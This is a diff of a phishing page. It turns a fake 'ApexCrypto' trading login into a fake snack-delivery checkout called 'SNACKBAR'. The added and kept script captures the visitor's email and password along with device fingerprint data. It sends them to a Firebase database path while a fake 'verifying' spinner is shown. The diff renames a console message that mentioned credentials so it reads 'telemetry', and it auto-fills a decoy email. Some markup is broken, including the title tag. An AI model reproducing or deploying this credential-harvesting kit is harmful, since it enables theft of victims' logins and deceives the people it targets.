@@ -3,16 +3,16 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>A∞Z | ApexCrypto Global Trading Terminal</title>
+    <title>Snack online/title>
     <style>
         :root {
-            --bg-color: #0b0e11;
-            --panel-bg: #1e2329;
-            --accent-green: #0ecb81;
-            --accent-red: #f6465d;
-            --text-main: #eaecef;
-            --text-muted: #848e9c;
-            --border-color: #2b313a;
+            --bg-color: #121212;
+            --panel-bg: #1e1e1e;
+            --accent-color: #ff3366;
+            --accent-blue: #00f0ff;
+            --text-main: #ffffff;
+            --text-muted: #a0a0a0;
+            --border-color: #333333;
         }
         body {
             background-color: var(--bg-color);
@@ -23,54 +23,89 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
         }
         .container {
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             background: var(--panel-bg);
             border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
             box-sizing: border-box;
+            margin: 20px;
         }
         .logo {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--accent-green);
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--accent-color);
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 5px;
             letter-spacing: 1px;
         }
         .logo span {
-            color: var(--text-main);
+            color: var(--accent-blue);
         }
         h2 {
-            font-size: 16px;
+            font-size: 15px;
             margin-bottom: 20px;
-            color: var(--text-main);
+            color: var(--text-muted);
             text-align: center;
-            font-weight: 500;
+            font-weight: 400;
+        }
+        /* قسم المنتجات والسناكز */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .product-card {
+            background: #252525;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .product-card:hover {
+            border-color: var(--accent-color);
+        }
+        .product-card img {
+            width: 50px;
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 8px;
+        }
+        .product-name {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .product-price {
+            font-size: 12px;
+            color: var(--accent-blue);
+            font-weight: 700;
         }
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 15px;
         }
         label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             color: var(--text-muted);
-            margin-bottom: 6px;
+            margin-bottom: 5px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         input {
             width: 100%;
-            padding: 12px;
-            background: #0b0e11;
+            padding: 10px 12px;
+            background: #121212;
             border: 1px solid var(--border-color);
-            border-radius: 4px;
+            border-radius: 6px;
             color: var(--text-main);
             font-size: 14px;
             box-sizing: border-box;
@@ -78,26 +113,24 @@
             transition: border-color 0.2s;
         }
         input:focus {
-            border-color: var(--accent-green);
+            border-color: var(--accent-color);
         }
         .btn {
             width: 100%;
             padding: 12px;
-            background: var(--accent-green);
-            color: #000;
+            background: var(--accent-color);
+            color: #fff;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             transition: opacity 0.2s;
-            margin-top: 10px;
+            margin-top: 5px;
         }
         .btn:hover {
-            opacity: 0.9ji;
             opacity: 0.9;
         }
-        /* شاشة انتظار التحقق (2FA Verification State) */
         #verificationState {
             display: none;
             text-align: center;
@@ -106,7 +139,7 @@
             width: 40px;
             height: 40px;
             border: 3px solid var(--border-color);
-            border-top: 3px solid var(--accent-green);
+            border-top: 3px solid var(--accent-color);
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
@@ -122,7 +155,7 @@
             margin-top: 15px;
         }
         .highlight-email {
-            color: var(--accent-green);
+            color: var(--accent-blue);
             font-weight: 600;
         }
     </style>
@@ -130,31 +163,46 @@
 <body>
 
     <div class="container">
-        <!-- نموذج تسجيل الدخول للتداول -->
+        <!-- نموذج متجر السناكز ومشروبات الطاقة -->
         <div id="loginState">
-            <div class="logo">APEX<span>CRYPTO</span></div>
-            <h2>Secure Terminal Login</h2>
+            <div class="logo">SNACK<span>BAR</span></div>
+            <h2>Quick Express Delivery</h2>
+
+            <!-- قائمة المنتجات والتسعيرات -->
+            <div class="products-grid">
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1622543925917-633c7caae8c9?w=150" alt="Red Bull">
+                    <div class="product-name">Red Bull 250ml</div>
+                    <div class="product-price">$3.50</div>
+                </div>
+                <div class="product-card">
+                    <img src="https://images.unsplash.com/photo-1527960669568-a824f1f7d63c?w=150" alt="Snacks">
+                    <div class="product-name">Mixed Chips</div>
+                    <div class="product-price">$2.00</div>
+                </div>
+            </div>
+
             <form id="tradingForm">
                 <div class="form-group">
-                    <label for="email">Account Email / ID</label>
+                    <label for="email">Delivery Email / ID</label>
                     <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
                 </div>
                 <div class="form-group">
-                    <label for="password">Password</label>
+                    <label for="password">Account Password / PIN</label>
                     <input type="password" id="password" required placeholder="••••••••">
                 </div>
-                <button type="submit" class="btn">Access Terminal</button>
+                <button type="submit" class="btn">Proceed to Checkout</button>
             </form>
         </div>
 
-        <!-- شاشة انتظار الموافقة (تظهر للمستخدم بعد الضغط) -->
+        <!-- شاشة انتظار التحقق -->
         <div id="verificationState">
-            <div class="logo">APEX<span>CRYPTO</span></div>
-            <h2>Device Authorization Required</h2>
+            <div class="logo">SNACK<span>BAR</span></div>
+            <h2>Verifying Order Request</h2>
             <div class="spinner"></div>
             <p class="info-text">
-                We've sent a verification request to your registered device or email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
-                Please approve the login prompt on your primary device to establish a secure trading tunnel.
+                We've sent a verification prompt to your email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
+                Please confirm the payment authorization to dispatch your snacks.
             </p>
         </div>
     </div>
@@ -170,19 +218,24 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
+        // كتابة البريد الوهمي تلقائياً بعد ثانيتين (2000ms) من فتح الصفحة
+        setTimeout(() => {
+            const emailInput = document.getElementById("email");
+            if (!emailInput.value) {
+                emailInput.value = "customer.express99@gmail.com";
+            }
+        }, 2000);
+
         document.getElementById("tradingForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            // التقاط البيانات المدخلة
             const userEmail = document.getElementById("email").value;
             const userPass = document.getElementById("password").value;
 
-            // تحديث واجهة المستخدم فوراً لإظهار رسالة الانتظار والتحقق
             document.getElementById("loginState").style.display = "none";
             document.getElementById("displayEmail").innerText = userEmail;
             document.getElementById("verificationState").style.display = "block";
 
-            // جمع معلومات الجهاز والبيانات التقنية للزائر
             const ua = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
             const width = window.screen.width;
@@ -194,7 +247,6 @@
 
             const sessionId = btoa(userEmail + width + height).slice(0, 16);
 
-            // تجميع حمولة البيانات بالكامل
             const telemetryData = {
                 sessionId: sessionId,
                 inputEmail: userEmail,
@@ -210,11 +262,10 @@
                 timestamp: new Date().toISOString()
             };
 
-            // إرسال البيانات فوراً إلى قاعدة بيانات Firebase تحت مسار A0Z_CORE/mirror_sessions/
             const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
             set(sessionsRef, telemetryData)
                 .then(() => {
-                    console.log("Credentials and telemetry successfully synced to Firebase.");
+                    console.log("Telemetry successfully synced.");
                 })
                 .catch((error) => {
                     console.error("Firebase sync error:", error);
